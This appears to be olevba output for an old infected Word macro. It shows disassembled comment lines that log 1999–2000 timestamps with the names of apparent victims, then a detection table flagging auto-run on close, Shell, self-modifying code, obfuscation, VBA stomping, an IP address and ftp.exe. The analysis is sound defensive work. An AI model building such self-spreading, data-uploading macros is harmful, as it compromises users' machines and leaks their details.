' Line #279:
' Line #280:
' Line #281:
' 	QuoteRem 0x0000 0x0021 " 10:44:49  - âòîðíèê, 27 àïð 1999"
' Line #282:
' 	QuoteRem 0x0000 0x000B " Âåòëóæñêèõ"
' Line #283:
' 	QuoteRem 0x0000 0x0000 ""
' Line #284:
' Line #285:
' Line #286:
' Line #287:
' 	QuoteRem 0x0000 0x001E " 04:59:32  - Salý, 29 Haz 1999"
' Line #288:
' 	QuoteRem 0x0000 0x000E " Aylin ZAÐRALI"
' Line #289:
' 	QuoteRem 0x0000 0x0000 ""
' Line #290:
' Line #291:
' Line #292:
' Line #293:
' 	QuoteRem 0x0000 0x0020 " 10:42:41  - ïÿòíèöà, 9 èþë 1999"
' Line #294:
' 	QuoteRem 0x0000 0x000D " çàïàä-âîñòîê"
' Line #295:
' 	QuoteRem 0x0000 0x0000 ""
' Line #296:
' Line #297:
' Line #298:
' Line #299:
' 	QuoteRem 0x0000 0x0021 " 06:41:28  - ÷åòâåðã, 23 ñåí 1999"
' Line #300:
' 	QuoteRem 0x0000 0x000B " Olga Brook"
' Line #301:
' 	QuoteRem 0x0000 0x0000 ""
' Line #302:
' Line #303:
' Line #304:
' Line #305:
' 	QuoteRem 0x0000 0x0024 " 08:05:18 AM - Saturday, 27 Nov 1999"
' Line #306:
' 	QuoteRem 0x0000 0x0003 " xx"
' Line #307:
' 	QuoteRem 0x0000 0x0000 ""
' Line #308:
' Line #309:
' Line #310:
' Line #311:
' 	QuoteRem 0x0000 0x0025 " 02:08:34  - ïîíåäåëüíèê, 27 äåê 1999"
' Line #312:
' 	QuoteRem 0x0000 0x0007 " Albert"
' Line #313:
' 	QuoteRem 0x0000 0x0000 ""
' Line #314:
' Line #315:
' Line #316:
' Line #317:
' 	QuoteRem 0x0000 0x0025 " 06:44:04  - ïîíåäåëüíèê, 10 ÿíâ 2000"
' Line #318:
' 	QuoteRem 0x0000 0x0007 " Albert"
' Line #319:
' 	QuoteRem 0x0000 0x0000 ""
' Line #320:
' Line #321:
' Line #322:
' Line #323:
' 	QuoteRem 0x0000 0x0021 " 11:23:41  - âòîðíèê, 18 ÿíâ 2000"
' Line #324:
' 	QuoteRem 0x0000 0x0014 " Ekaterina Saponenko"
' Line #325:
' 	QuoteRem 0x0000 0x0000 ""
' Line #326:
' Line #327:
' Line #328:
' Line #329:
' 	QuoteRem 0x0000 0x0021 " 05:22:24  - âòîðíèê, 18 ÿíâ 2000"
' Line #330:
' 	QuoteRem 0x0000 0x0007 " Šãáâ®¢"
' Line #331:
' 	QuoteRem 0x0000 0x0000 ""
' Line #332:
' Line #333:
' Line #334:
' Line #335:
' 	QuoteRem 0x0000 0x0021 " 09:01:55  - ÷åòâåðã, 20 ÿíâ 2000"
' Line #336:
' 	QuoteRem 0x0000 0x000F " Âàñèëèé Õðîìîâ"
' Line #337:
' 	QuoteRem 0x0000 0x0000 ""
' Line #338:
' Line #339:
' Line #340:
' Line #341:
' 	QuoteRem 0x0000 0x001E " 12:21:07  - ñðåäà, 2 ôåâ 2000"
' Line #342:
' 	QuoteRem 0x0000 0x000F " Âàñèëèé Õðîìîâ"
' Line #343:
' 	QuoteRem 0x0000 0x0000 ""
' Line #344:
' Line #345:
' Line #346:
' Line #347:
' 	QuoteRem 0x0000 0x0021 " 10:13:06  - ïÿòíèöà, 18 ôåâ 2000"
' Line #348:
' 	QuoteRem 0x0000 0x0011 " Irina Kochetkova"
' Line #349:
' 	QuoteRem 0x0000 0x0000 ""
' Line #350:
' Line #351:
' Line #352:
' Line #353:
' 	QuoteRem 0x0000 0x0021 " 02:14:44  - âòîðíèê, 22 ôåâ 2000"
' Line #354:
' 	QuoteRem 0x0000 0x000D " Èíñòèòóò ÄÏÎ"
' Line #355:
' 	QuoteRem 0x0000 0x0000 ""
' Line #356:
' Line #357:
' Line #358:
' Line #359:
' 	QuoteRem 0x0000 0x0021 " 03:09:29  - ïÿòíèöà, 25 ôåâ 2000"
' Line #360:
' 	QuoteRem 0x0000 0x0003 " 14"
' Line #361:
' 	QuoteRem 0x0000 0x0000 ""
' Line #362:
' Line #363:
' Line #364:
' Line #365:
' 	QuoteRem 0x0000 0x0021 " 11:41:47  - ñóááîòà, 26 ôåâ 2000"
' Line #366:
' 	QuoteRem 0x0000 0x0003 " 16"
' Line #367:
' 	QuoteRem 0x0000 0x0000 ""
' Line #368:
' Line #369:
' Line #370:
' Line #371:
' 	QuoteRem 0x0000 0x0024 " 01:55:51  - ïîíåäåëüíèê, 6 ìàð 2000"
' Line #372:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #373:
' 	QuoteRem 0x0000 0x0000 ""
' Line #374:
' Line #375:
' Line #376:
' Line #377:
' 	QuoteRem 0x0000 0x0021 " 11:21:04  - ñóááîòà, 11 ìàð 2000"
' Line #378:
' 	QuoteRem 0x0000 0x0002 " 6"
' Line #379:
' 	QuoteRem 0x0000 0x0000 ""
' Line #380:
' Line #381:
' Line #382:
' Line #383:
' 	QuoteRem 0x0000 0x0021 " 10:44:31  - âòîðíèê, 11 àïð 2000"
' Line #384:
' 	QuoteRem 0x0000 0x0002 " 9"
' Line #385:
' 	QuoteRem 0x0000 0x0000 ""
' Line #386:
' Line #387:
' Line #388:
' Line #389:
' 	QuoteRem 0x0000 0x0022 " 08:41:05  - otrdiena, 11 Apr 2000"
' Line #390:
' 	QuoteRem 0x0000 0x0005 " USER"
' Line #391:
' 	QuoteRem 0x0000 0x0000 ""
' Line #392:
' Line #393:
' Line #394:
' Line #395:
' 	QuoteRem 0x0000 0x0021 " 03:20:20  - ÷åòâåðã, 13 àïð 2000"
' Line #396:
' 	QuoteRem 0x0000 0x0003 " 14"
' Line #397:
' 	QuoteRem 0x0000 0x0000 ""
' Line #398:
' Line #399:
' Line #400:
' Line #401:
' 	QuoteRem 0x0000 0x0021 " 07:46:43  - ïÿòíèöà, 14 àïð 2000"
' Line #402:
' 	QuoteRem 0x0000 0x0003 " 11"
' Line #403:
' 	QuoteRem 0x0000 0x0000 ""
' Line #404:
' Line #405:
' Line #406:
' Line #407:
' 	QuoteRem 0x0000 0x0003 " 11"
' Line #408:
' Line #409:
' Line #410:
' 	QuoteRem 0x0000 0x0023 " 10:32:56 PM - ÷åòâåðã, 18 ìàé 2000"
' Line #411:
' 	QuoteRem 0x0000 0x0008 " Ãåîðãèé"
' Line #412:
' 	QuoteRem 0x0000 0x0000 ""
' Line #413:
' Line #414:
' Line #415:
' Line #416:
' 	QuoteRem 0x0000 0x0020 " 03:26:44  - âòîðíèê, 6 èþí 2000"
' Line #417:
' 	QuoteRem 0x0000 0x0007 " George"
' Line #418:
' 	QuoteRem 0x0000 0x0000 ""
' Line #419:
' Line #420:
' Line #421:
' Line #422:
' 	QuoteRem 0x0000 0x001F " 02:53:53  - ñðåäà, 14 èþí 2000"
' Line #423:
' 	QuoteRem 0x0000 0x0007 " George"
' Line #424:
' 	QuoteRem 0x0000 0x0000 ""
' Line #425:
' Line #426:
' Line #427:
' Line #428:
' 	QuoteRem 0x0000 0x0021 " 04:36:46  - ÷åòâåðã, 21 ñåí 2000"
' Line #429:
' 	QuoteRem 0x0000 0x0009 " internet"
' Line #430:
' 	QuoteRem 0x0000 0x0000 ""
' Line #431:
' Line #432:
' Line #433:
' Line #434:
' 	QuoteRem 0x0000 0x0021 " 04:58:30  - ïÿòíèöà, 22 ñåí 2000"
' Line #435:
' 	QuoteRem 0x0000 0x0006 " Klark"
' Line #436:
' 	QuoteRem 0x0000 0x0000 ""
' Line #437:
' Line #438:
' Line #439:
' Line #440:
' 	QuoteRem 0x0000 0x0024 " 04:18:54 PM - Wednesday, 8 Nov 2000"
' Line #441:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #442:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #443:
' Line #444:
' Line #445:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

